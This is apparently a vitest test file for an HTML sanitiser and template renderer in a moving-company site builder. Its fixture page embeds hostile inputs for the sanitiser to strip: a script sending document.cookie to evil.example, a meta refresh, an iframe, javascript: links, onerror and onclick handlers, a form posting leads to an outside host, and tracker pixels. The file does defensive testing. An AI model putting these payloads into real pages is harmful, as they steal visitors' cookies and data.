import { describe, expect, it } from 'vitest';
import {
  OTHER_CATEGORY, TEMPLATE_CATEGORIES, categoryLabel, contentFlags, htmlProblems, pageFor, prepareTemplate, renderTemplatePage,
  replaceForms, sanitiseHtml, templateCategory, templateId,
} from '../../supabase/functions/_shared/site-template.ts';

const ASSET_HOST = 'assets.flyttgo.test';

// A page shaped like Architect-AI's site masters (sample company "Swiftmove").
const HOME = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>Swiftmove — Movers in Columbus</title>
<link rel="stylesheet" href="https://cdn.example.com/x.css">
<meta http-equiv="refresh" content="0;url=https://evil.example">
<style>:root{--c-primary:#E4572E;--c-accent:#17335F}@import url("https://fonts.example/f.css");
.hero{background:url(https://tracker.example/p.gif)}</style></head>
<body><nav><a href="{{BASE}}/">Home</a><a href="{{BASE}}/services">Services</a><a href="#quote">Get a quote</a></nav>
<h1 onclick="steal()">Swiftmove moves Columbus</h1>
<img src="{{ASSET:hero}}" alt=""><img src="https://tracker.example/pixel.gif">
<p>Crews from $129/hr, flat-rate moves from $420. Since 2009, 4,000+ moves. Rated 4.9/5 on Google reviews.</p>
<p>Call (614) 555-0139 or write to crew@swiftmove.co</p><a href="tel:+16145550139">Call</a><a href="mailto:crew@swiftmove.co">Mail</a>
<a href="javascript:alert(1)">x</a>
<form action="https://collect.example/lead" method="post"><input name="email"><button>Send</button></form>
<iframe src="https://evil.example"></iframe>
<script>fetch('https://evil.example/?c='+document.cookie)</script>
</body></html>`;

describe('sanitiseHtml', () => {
  it('removes everything that runs code, loads from elsewhere or sends data', () => {
    const { html, removed } = sanitiseHtml(HOME, [ASSET_HOST]);
    expect(html).not.toMatch(/<script|onclick|javascript:|<iframe|<form|<input|<link|http-equiv|@import|tracker\.example|cdn\.example/i);
    expect(removed).toMatchObject({ scripts: 1, handlers: 1, jsUrls: 1, frames: 1, forms: 1, links: 1, refresh: 1, imports: 1, externalSrc: 1 });
    expect(htmlProblems(html)).toEqual([]);
    expect(html).toContain('{{BOOKING_URL}}');           // the form became a booking link
  });

  it('keeps images from the asset store', () => {
    const { html } = sanitiseHtml(`<img src="https://${ASSET_HOST}/a.jpg"><div style="background:url(https://${ASSET_HOST}/b.jpg)">`, [ASSET_HOST]);
    expect(html).toContain(`https://${ASSET_HOST}/a.jpg`);
    expect(html).toContain(`https://${ASSET_HOST}/b.jpg`);
  });

  it('catches script tags in odd spellings', () => {
    for (const s of ['<SCRIPT>x</SCRIPT>', '<script src=x>', '<img src=x onerror=alert(1)>', '<a href="  javascript:x">', '<embed src=x>']) {
      expect(htmlProblems(sanitiseHtml(s).html)).toEqual([]);
    }
  });
});

describe('prepareTemplate (import)', () => {
  const t = prepareTemplate({
    id: 'moving-swiftmv01', name: 'Swiftmove', industry: ['moving', 'movers'], style: 'bold',
    pages: JSON.stringify([{ path: '/', html: HOME }, { path: '/contact', html: '<p>Swiftmove, (614) 555-0139</p>' }]),
    preview_assets: [{ key: 'hero', url: `https://${ASSET_HOST}/hero.jpg` }],
  }, [ASSET_HOST]);

  it('turns the sample company into placeholders and quote links into the booking page', () => {
    const home = t.pages[0].html;
    expect(t.id).toBe('moving-swiftmv01');
    expect(home).not.toMatch(/Swiftmove|555-0139|crew@swiftmove\.co/);
    expect(home).toContain('<title>{{brand.name}} — Movers in Columbus</title>');
    expect(home).toContain('href="tel:{{brand.phone_tel}}"');
    expect(home).toContain('href="mailto:{{brand.email}}"');
    expect(home).toContain('href="{{BOOKING_URL}}"');
    expect(t.pages[1].html).toBe('<p>{{brand.name}}, {{brand.phone}}</p>');
  });

  it('lists what a person must still check: prices, reviews, claims', () => {
    const kinds = new Set(t.flags.map(f => f.kind));
    expect(kinds.has('price')).toBe(true);
    expect(kinds.has('review')).toBe(true);
    expect(kinds.has('claim')).toBe(true);
    expect(kinds.has('phone')).toBe(false);              // replaced
    expect(t.flags.find(f => f.kind === 'price')?.sample).toContain('$129/hr');
    expect(t.removed.scripts).toBe(1);
  });

  it('makes safe ids', () => {
    expect(templateId('Moving Swift_MV01!')).toBe('moving-swift-mv01');
  });
});

describe('renderTemplatePage (serve)', () => {
  const prepared = prepareTemplate({ id: 'x', name: 'Swiftmove', pages: [{ path: '/', html: HOME }] }, [ASSET_HOST]).pages[0].html;
  const html = renderTemplatePage(prepared, {
    brand: { name: 'Acme <Flytt>', phone: '+47 22 33 44 55', email: 'kundeservice@acme.no', primaryColor: '#0055aa', accentColor: '#ffcc00' },
    assets: [{ key: 'hero', url: `https://${ASSET_HOST}/hero.jpg` }],
    pageUrl: (p) => `/b/acme?page=${encodeURIComponent(p)}`,
    bookingUrl: '/b/acme/book',
    sellerNotice: 'Moves booked here are sold and carried out by FlyttGo AS (org. nr. 923609016).',
    assetHosts: [ASSET_HOST],
  });

  it('fills in the company, escaped', () => {
    expect(html).toContain('Acme &lt;Flytt&gt;');
    expect(html).not.toContain('<Flytt>');
    expect(html).toContain('href="tel:+4722334455"');
    expect(html).toContain(':root{--c-primary:#0055aa;--c-accent:#ffcc00}');
    expect(html).toContain(`src="https://${ASSET_HOST}/hero.jpg"`);
  });

  it('sends links out of the frame: pages of the site and the booking page', () => {
    expect(html).toContain('href="/b/acme?page=%2Fservices" target="_top"');
    expect(html).toContain('href="/b/acme/book" target="_top"');
    expect(html).not.toMatch(/\{\{/);
  });

  it('says who sells, on every page', () => {
    expect(html).toMatch(/<div class="fg-seller">Moves booked here are sold and carried out by FlyttGo AS[^<]*<\/div><\/body>/);
  });

  it('never lets an image come from elsewhere through an asset', () => {
    const out = renderTemplatePage('<img src="{{ASSET:hero}}">', {
      brand: { name: 'A' }, assets: [{ key: 'hero', url: 'https://tracker.example/p.gif' }],
      pageUrl: () => '/', bookingUrl: '/', sellerNotice: '', assetHosts: [ASSET_HOST],
    });
    expect(out).toContain('src=""');
  });

  it('picks the page for a path', () => {
    const pages = [{ path: '/', html: 'home' }, { path: '/services', html: 'svc' }];
    expect(pageFor(pages, '/services/')?.html).toBe('svc');
    expect(pageFor(pages, '/nope')?.html).toBe('home');
  });
});

describe('contentFlags', () => {
  it('finds Norwegian prices too', () => {
    expect(contentFlags('<p>Fra 1 290 kr per time</p>', '/').some(f => f.kind === 'price')).toBe(true);
  });
});

describe('the catalogue categories', () => {
  it('puts every template in a category, never health', () => {
    expect(templateCategory(['moving', 'movers'])).toBe('transport');
    expect(templateCategory(['logistics', 'man-and-van'])).toBe('transport');
    expect(templateCategory(['automotive'])).toBe('trades');
    expect(templateCategory(['hair-salon'])).toBe('appointments');
    expect(templateCategory(['restaurant'])).toBe('hospitality');
    expect(templateCategory(['mining'])).toBe('industry');
    expect(templateCategory(['something-new'])).toBe(OTHER_CATEGORY.id);
    expect(templateCategory([])).toBe(OTHER_CATEGORY.id);
    expect(templateCategory(['dental', 'clinic'])).toBeNull();
    expect(templateCategory(['beauty', 'medical-spa'])).toBeNull();
  });
  it('has a label for every category and no industry in two', () => {
    const seen = new Map<string, string>();
    for (const c of TEMPLATE_CATEGORIES) {
      expect(categoryLabel(c.id)).toBe(c.label);
      for (const t of c.tags) { expect(seen.get(t), `${t} in ${seen.get(t)} and ${c.id}`).toBeUndefined(); seen.set(t, c.id); }
    }
    expect(categoryLabel('other')).toBe(OTHER_CATEGORY.label);
  });
});

describe('keeping the template\'s look', () => {
  it('turns a form into a card with its classes and a booking button', () => {
    const h = replaceForms('<div class="cta-grid"><form class="lead" data-lead-form><input name="email"><button>Send</button></form></div>');
    expect(h).toContain('<div class="lead fg-book-card">');
    expect(h).toContain('href="{{BOOKING_URL}}"');
    expect(h).not.toMatch(/<form|<input|<button/);
  });
  it('replaces the sample name where the page writes "&" as "&amp;", also in image descriptions', () => {
    const t = prepareTemplate({ id: 'x', name: 'Fast Man & Van', pages: [{ path: '/', html:
      '<html><head><title>Fast Man & Van — UK</title></head><body><a class="brand">Fast Man &amp; Van</a>'
      + '<img src="{{ASSET:hero}}" alt="A Fast Man &amp; Van removal van"><p>Fast Man &amp; Vans</p></body></html>' }] });
    const h = t.pages[0].html;
    expect(h).toContain('<a class="brand">{{brand.name}}</a>');
    expect(h).toContain('alt="A {{brand.name}} removal van"');
    expect(h).toContain('<title>{{brand.name}} — UK</title>');
    expect(h).toContain('Fast Man &amp; Vans');                      // a longer word is left alone
  });
  it('shows content scripts would have faded in', () => {
    const h = renderTemplatePage('<html><head><style>.reveal{opacity:0}</style></head><body><div class="reveal">Hi</div></body></html>', {
      brand: { name: 'A' }, assets: [], pageUrl: () => '#', bookingUrl: '#', sellerNotice: 'n' });
    expect(h).toMatch(/\.reveal\{opacity:1!important;transform:none!important\}/);
    expect(h.indexOf('.reveal{opacity:1')).toBeGreaterThan(h.indexOf('.reveal{opacity:0}'));
  });
});
